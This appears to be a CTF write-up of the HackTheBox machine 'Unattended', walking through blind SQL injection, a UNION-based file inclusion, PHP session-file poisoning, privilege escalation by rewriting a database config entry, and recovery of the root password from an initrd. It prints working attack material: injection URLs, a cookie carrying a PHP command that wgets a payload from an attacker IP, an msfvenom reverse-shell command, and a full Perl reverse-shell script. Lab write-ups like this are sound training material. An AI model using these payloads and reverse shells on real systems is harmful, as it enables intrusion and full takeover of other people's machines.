---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-04-28-unattended-hackthebox
tags:
- hackthebox
- linux
- log poisoning
- sql injection
- web
title: Unattended @ HackTheBox
---

Unattended is a high difficulty machine on hackthebox, featuring manual sql injection, log poisoning and some guessing.

## User Flag

Starting with a tcp port scan we get the following result:

```
80/tcp  open  http
443/tcp open  https
```

We look at https://unattended.htb which just gives back an empty page (containing only a single dot). The same behavior happens when going to the http variant. By looking at the certificate of the page in firefox we can obtain another url: "www.nestedflanders.htb". After adding the url to our hosts file we visit the page and get a default apache2 website. We try some default urls and finally get the "real" website by going to "https://www.nestedflanders.htb/index.php":

![](htb_unattended_site.png)

The sites navigation is being realized through the id parameter – we run some word lists on it to check for LFI and injection vulnerabilities. In addition we start sqlmap against the host. Sqlmap eventually succeeds in finding an injection vector:

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=587' AND 3136=3136 AND 'csjV'='csjV
```

With the discovered injection we can potentially dump the database, the process is however very slow. We focus on dumping tables that sound interesting to speed things up. To do so we start by listing the tables (with the `--tables` option):

```
Database: neddy
[11 tables]
+---------------------------------------+
| config                                |
| customers                             |
| employees                             |
| filepath                              |
| idname                                |
| offices                               |
| orderdetails                          |
| orders                                |
| payments                              |
| productlines                          |
| products                              |
+---------------------------------------+
```

Next we dump the filepath table:

```
Database: neddy
Table: filepath
[3 entries]
+---------+--------------------------------------+
| name    | path                                 |
+---------+--------------------------------------+
| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
| contact | 0f710bba8d16303a415266af8bb52fcb.php |
| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
+---------+--------------------------------------+
```

This shows us that the actual files, that we include by changing the id parameter, have md5 hashes as names on the filesystem. We verify this by calling the files in a web browser and confirm that they exist. In the table "idname" we find more information:

```
Database: neddy
Table: idname
[6 entries]
+-----+-------------+----------+
| id  | name        | disabled |
+-----+-------------+----------+
| 1   | main.php    | 1        |
| 2   | about.php   | 1        |
| 3   | contact.php | 1        |
| 25  | main        | 0        |
| 465 | about       | 0        |
| 587 | contact     | 0        |
+-----+-------------+----------+
```

This shows how the mapping id to filename works. We query the idname table by id and use the resulting name to find the file in the filepath table. After experimenting for a while with possible injections, we find the following one, giving us LFI:

```
https://www.nestedflanders.htb/index.php?id=25%27+UNION+SELECT+%22contact%27+UNION+SELECT+%27/etc/passwd%27+LIMIT+1,1;--%20%22;--%20
```

There are multiple ways to turn this into a shell. The classical way is to poison log files like access.log or error.log – that is however a bit annoying because multiple people are working on the box and one error will make the log unusable. We decide to go with session file poisoning instead:

```
https://www.nestedflanders.htb/index.php?id=25'+UNION+SELECT+"contact'+UNION+SELECT+'/var/lib/php/sessions/sess_48ge9cgn7iqdn5fh37r0573072'+LIMIT+1,1;--%20";--%20
```

As we can now call our session file we just have to add php code we want to execute into our cookie. We generate a meterpreter php shell with `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.66 LPORT=80 > 0db9774b86aa5a219a0939cdd5c5aa08.php` and get it onto the box by crafting the cookie:

```
Cookie: PHPSESSID=48ge9cgn7iqdn5fh37r0573072; Fun=<?php passthru('cd /tmp && rm * && wget http://10.10.16.66/0db9774b86aa5a219a0939cdd5c5aa08.php && ls -l')?>;
```

After starting a webserver we call the sessions file again, triggering the upload of our shell. The final step remaining is to use the LFI to call our php file, resulting in a shell:

```
[*] Started reverse TCP handler on 10.10.16.66:80
[*] Sending stage (38247 bytes) to 10.10.10.126
[*] Meterpreter session 1 opened (10.10.16.66:80 -> 10.10.10.126:41258) at 2019-04-28 16:15:16 +0200
meterpreter > sysinfo
Computer    : unattended
OS          : Linux unattended 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
Meterpreter : php/linux
```

Now that we have a shell as www-data we further enumerate the box. In index.php we find the actual query that resulted in the shell, and database credentials:

```
$sql = "SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id";
...
$servername = "localhost";
$username = "nestedflanders";
$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
```

It’s now possible is to effectively dump the database using the mysql commandline:

```
echo "use neddy; select * from config;" | mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e
...
86    checkrelease    /home/guly/checkbase.pl;/home/guly/checkplugins.pl;
...
```

Inside the config table we notice an interesting field called "checkrelease", which seems to have two shell scripts that are executed. Maybe we can alter these scripts ? We miss permissions to to access the referenced scripts, but we can change the database entry, leading to execution of our own script! We create a small perl script that gives us a shell (it does not have to be perl):

```python
#!/usr/bin/env perl
use Socket;
$i="10.10.16.66";
$p=80;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
};
```

Unfortunately /tmp is not executable for us, which we can see by typing mount:

```
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
```

We find an executable location where our session file was in "/var/lib/php/sessions/", so we copy the shell there, make it executable and update the db entry:

```
wget http://10.10.16.66/xct.pl
chmod +x xct.pl
echo "use neddy; UPDATE config SET option_value = '/var/lib/php/sessions/xct.pl' where option_name = 'checkrelease';" | mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e
```

We get a shell in the context of guly back and can read the user flag:

```
listening on [any] 80 ...
connect to [10.10.16.66] from unattended.unattended.htb [10.10.10.126] 41264
/bin/sh: 0: can't access tty; job control turned off
$ whoami
guly
$ wc -c /home/guly/user.txt
33 /home/guly/user.txt
```

## Root Flag

When looking for the solution to root we first check which permissions guly has, that www-data didn’t have:

```
uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)
```

The grub group is of special interest here, because that is unusual and the boot loader has some power in the system. Inside "/boot" we find "initrd.img-4.9.0-8-amd64", which we copy to our home folder and extract with `zcat initrd.img-4.9.0-8-amd64 | cpio -idmv`. By grepping for "guly" over the extracted files we notice this:

```
./scripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sync when root changes her one
```

Inside the file where the comment is in, we see this line:

```
...
/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
...
```

This seems to generate the root password (to pipe it into cryptopen). We can not execute "/sbin/uinitrd" ourselves though. Luckily the extracted image contains the binary too which we execute and get the root password:

```
$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
132f93ab100671dcb263acaf5dc95d8260e8b7c6
```

We can not just su to root because we are not in a proper terminal. By running `ss -ltn` we notice that ssh is open on ipv6. We add our key to authorized keys of guly and log in as guly over ssh (root remote login fails). Now it is possible to su to root and read the flag.